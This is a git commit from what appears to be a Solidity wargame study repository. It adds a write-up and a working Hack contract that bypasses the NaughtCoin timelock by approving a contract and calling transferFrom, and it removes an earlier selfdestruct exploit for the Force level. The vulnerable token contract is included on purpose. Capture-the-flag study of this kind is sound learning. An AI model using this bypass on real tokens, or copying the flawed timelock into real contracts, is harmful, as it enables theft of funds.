0074ce127edb510641da76207e376723f5cfc646
Patrick Zimmerer <p.zimmerer@east-young.de>
2023-03-22 19:32:51 +0100

    Solved NaughtCoin + Documentation

--- day14-15/Naught Coin/README.md
+++ day14-15/Naught Coin/README.md
@@ -11,11 +11,23 @@
 
 ### Solution
 
-- Placeholder
+- The weakness lies in the `lockTokens()` modifier which only checks if the msg.sender is the player and then checks for the timeLock, if we just approve another contract for the amount of tokens we own, that contract could just call ERC20s `transferFrom()` and transfer the amount of tokens to an arbitrary addresss since he is an approved spender
+- Step 1: Deploy Hack contract
+- Step 2: Approve Hack contract for the balanceOf the player
+- Step 3: Call attacj function on Hack contract
 
 ### Fuzzing Contract
 
 ```solidity
 contract Hack {
+    address player = msg.sender;
+    NaughtCoin naughtCoin;
+    constructor(address _naughtCoin){
+        naughtCoin = NaughtCoin(_naughtCoin);
+    }
+
+    function attack() public {
+        naughtCoin.transferFrom(player, address(this), 1000000000000000000000000);
+    }
 }
 ```
--- day14-15/Naught Coin/contracts/NaughtCoin.sol
+++ day14-15/Naught Coin/contracts/NaughtCoin.sol
@@ -1,28 +1,39 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract Force {
-    /*
+import "../../../node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol";
 
-                   MEOW ?
-         /\_/\   /
-    ____/ o o \
-  /~____  =ø= /
- (______)__m_m)
+contract NaughtCoin is ERC20 {
+    // string public constant name = 'NaughtCoin';
+    // string public constant symbol = '0x0';
+    // uint public constant decimals = 18;
+    uint public timeLock = block.timestamp + 10 * 365 days;
+    uint256 public INITIAL_SUPPLY;
+    address public player;
 
-*/
-}
-
-contract Hack {
-    Force force;
-
-    constructor(address payable _force) {
-        force = Force(_force);
+    constructor(address _player) ERC20("NaughtCoin", "0x0") {
+        player = _player;
+        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
+        // _totalSupply = INITIAL_SUPPLY;
+        // _balances[player] = INITIAL_SUPPLY;
+        _mint(player, INITIAL_SUPPLY);
+        emit Transfer(address(0), player, INITIAL_SUPPLY);
     }
 
-    function sendEther() public payable {
-        selfdestruct(payable(address(force)));
+    function transfer(
+        address _to,
+        uint256 _value
+    ) public override lockTokens returns (bool) {
+        super.transfer(_to, _value);
     }
 
-    receive() external payable {}
+    // Prevent the initial owner from transferring tokens until the timelock has passed
+    modifier lockTokens() {
+        if (msg.sender == player) {
+            require(block.timestamp > timeLock);
+            _;
+        } else {
+            _;
+        }
+    }
 }
